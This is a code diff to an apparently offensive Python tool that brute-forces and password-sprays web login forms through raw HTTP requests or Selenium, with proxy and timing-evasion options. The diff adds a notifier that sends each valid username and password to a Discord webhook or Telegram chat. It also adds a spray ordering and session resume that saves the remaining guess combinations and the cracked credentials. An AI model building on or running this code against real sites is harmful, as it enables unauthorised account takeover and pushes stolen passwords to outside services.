@@ -49,6 +49,13 @@ def run_attack_cli(args: argparse.Namespace) -> None:
     _GLOBAL_STOP: threading.Event = threading.Event()
     _FOUND_EVENT: threading.Event = threading.Event()
 
+    from .notifier import Notifier
+    notifier = Notifier()
+    if getattr(args, "discord_webhook", None):
+        notifier.add_discord(args.discord_webhook)
+    if getattr(args, "telegram_token", None) and getattr(args, "telegram_chat_id", None):
+        notifier.add_telegram(args.telegram_token, args.telegram_chat_id)
+
     def _signal_handler(sig: int, frame: Any) -> None:
         """Handle Ctrl+C / Ctrl+X for graceful shutdown."""
         print(f"\n{_YELLOW}[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...{_RESET}")
@@ -269,7 +276,7 @@ def run_attack_cli(args: argparse.Namespace) -> None:
         if attack_mode == "http":
             _run_http_attack(
                 args, users, passwords, proxies, TARGET_URL,
-                _GLOBAL_STOP, _FOUND_EVENT,
+                _GLOBAL_STOP, _FOUND_EVENT, notifier=notifier,
             )
             return
 
@@ -278,7 +285,7 @@ def run_attack_cli(args: argparse.Namespace) -> None:
         # ═══════════════════════════════════════════════════════════
         _run_browser_attack(
             args, users, passwords, proxies, TARGET_URL,
-            auto_detect, _GLOBAL_STOP, _FOUND_EVENT,
+            auto_detect, _GLOBAL_STOP, _FOUND_EVENT, notifier=notifier,
         )
 
     finally:
@@ -299,7 +306,17 @@ def _run_http_attack(
     target_url: str,
     global_stop: threading.Event,
     found_event: threading.Event,
+    notifier: Any = None,
 ) -> None:
+    from .session import SessionManager
+    session_mgr = SessionManager() if not getattr(args, "no_session", False) else None
+    if getattr(args, "resume", False) and session_mgr and session_mgr.has_session():
+        state = session_mgr.load_state()
+        if state:
+            print(f"{_GREEN}[+] Resuming previous HTTP attack session saved at {state.get('saved_at_iso')}{_RESET}")
+            remaining_combos = state.get("remaining_combos", [])
+            users = [c[0] for c in remaining_combos]
+            passwords = list(set(c[1] for c in remaining_combos))
     """Run the raw HTTP attack using HTTPAttackEngine."""
     from .http_engine import HTTPAttackEngine
 
@@ -377,6 +394,9 @@ def _run_http_attack(
         "csrf_field": getattr(args, "csrf_field", ""),
         "extra_fields": extra_fields,
         "follow_redirects": getattr(args, "follow_redirects", False),
+        "notifier": notifier,
+        "spray_mode": getattr(args, "spray", False),
+        "enable_session": not getattr(args, "no_session", False),
     }
 
     # Start attack (blocking — waits for thread internally)
@@ -435,6 +455,7 @@ def _run_browser_attack(
     auto_detect: bool,
     global_stop: threading.Event,
     found_event: threading.Event,
+    notifier: Any = None,
 ) -> None:
     """Run the browser-based Selenium attack."""
     from selenium import webdriver
@@ -571,6 +592,9 @@ def _run_browser_attack(
     except Exception:
         pass
 
+    from .session import SessionManager
+    session_mgr = SessionManager() if not getattr(args, "no_session", False) else None
+
     # LOAD WORDLIST INTO QUEUE
     q: Queue = Queue(maxsize=1000)
     total_combos: int = len(users) * len(passwords)
@@ -592,10 +616,46 @@ def _run_browser_attack(
     _cli_found_users_lock = threading.Lock()
     _cli_start_time: float = time.time()
 
-    def populate() -> None:
-        for user in users:
-            for pwd in passwords:
-                q.put((user, pwd))
+    # Check for session resume
+    resumed = False
+    if getattr(args, "resume", False) and session_mgr and session_mgr.has_session():
+        state = session_mgr.load_state()
+        if state:
+            print(f"{_GREEN}[+] Resuming previous Browser attack session saved at {state.get('saved_at_iso')}{_RESET}")
+            remaining_combos = state.get("remaining_combos", [])
+            resumed = True
+
+            def populate_resume() -> None:
+                for u, p in remaining_combos:
+                    q.put((u, p))
+
+            populate = populate_resume
+            # Seed metrics
+            with _cli_metrics_lock:
+                for k, v in state.get("metrics", {}).items():
+                    if k in _cli_metrics:
+                        _cli_metrics[k] = v
+            # Seed found creds
+            with _cli_found_creds_lock:
+                for u, p in state.get("found_creds", []):
+                    _cli_found_creds.append((u, p))
+            # Seed found users
+            with _cli_found_users_lock:
+                for u, p in state.get("found_creds", []):
+                    _cli_found_users.add(u)
+
+    if not resumed:
+        spray_mode = getattr(args, "spray", False)
+        def populate_normal() -> None:
+            if spray_mode:
+                for pwd in passwords:
+                    for user in users:
+                        q.put((user, pwd))
+            else:
+                for user in users:
+                    for pwd in passwords:
+                        q.put((user, pwd))
+        populate = populate_normal
 
     threading.Thread(target=populate, daemon=True).start()
 
@@ -752,6 +812,12 @@ def _run_browser_attack(
                             print(
                                 f"\n{_GREEN}{_BOLD}[+] VALID CREDENTIALS FOUND: {user} / {pwd}{_RESET}\n"
                             )
+                            if notifier and notifier.has_backends:
+                                notifier.notify("credential_found", {
+                                    "username": user,
+                                    "password": pwd,
+                                    "target_url": target_url
+                                })
                             with _cli_metrics_lock:
                                 _cli_metrics["successes"] += 1
                             with _cli_found_creds_lock:
@@ -764,6 +830,29 @@ def _run_browser_attack(
                                     cf.write(f"{user}:{pwd}\n")
                             except Exception as e:
                                 print(f"{_RED}[-] Could not save credential: {e}{_RESET}")
+
+                            # Save session state
+                            if session_mgr:
+                                remaining = []
+                                try:
+                                    with q.mutex:
+                                        remaining = list(q.queue)
+                                except Exception:
+                                    pass
+                                dummy_ctx = {
+                                    "target_url": target_url,
+                                    "error_msg": ERROR_MSG,
+                                    "success_msg": SUCCESS_MSG,
+                                    "threads": THREADS,
+                                    "delay": DELAY,
+                                    "jitter": JITTER,
+                                    "headless": RUN_HEADLESS,
+                                    "cooldown": COOLDOWN,
+                                }
+                                session_mgr.save_state(
+                                    dummy_ctx, remaining, dict(_cli_metrics),
+                                    list(_cli_found_creds)
+                                )
 
                             if not CONTINUE_AFTER_SUCCESS:
                                 found_event.set()
@@ -784,6 +873,29 @@ def _run_browser_attack(
                         else:
                             with _cli_metrics_lock:
                                 _cli_metrics["failures"] += 1
+
+                            # Save session state periodically
+                            if session_mgr and attempt_num % session_mgr.auto_save_interval == 0:
+                                remaining = []
+                                try:
+                                    with q.mutex:
+                                        remaining = list(q.queue)
+                                except Exception:
+                                    pass
+                                dummy_ctx = {
+                                    "target_url": target_url,
+                                    "error_msg": ERROR_MSG,
+                                    "success_msg": SUCCESS_MSG,
+                                    "threads": THREADS,
+                                    "delay": DELAY,
+                                    "jitter": JITTER,
+                                    "headless": RUN_HEADLESS,
+                                    "cooldown": COOLDOWN,
+                                }
+                                session_mgr.save_state(
+                                    dummy_ctx, remaining, dict(_cli_metrics),
+                                    list(_cli_found_creds)
+                                )
 
                     except (NoSuchElementException, WebDriverException):
                         with _cli_metrics_lock:
@@ -854,5 +966,7 @@ def _run_browser_attack(
         found_event.set()
         global_stop.set()
     finally:
+        if session_mgr:
+            session_mgr.clear_session()
         if global_stop.is_set() and not found_event.is_set():
             print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
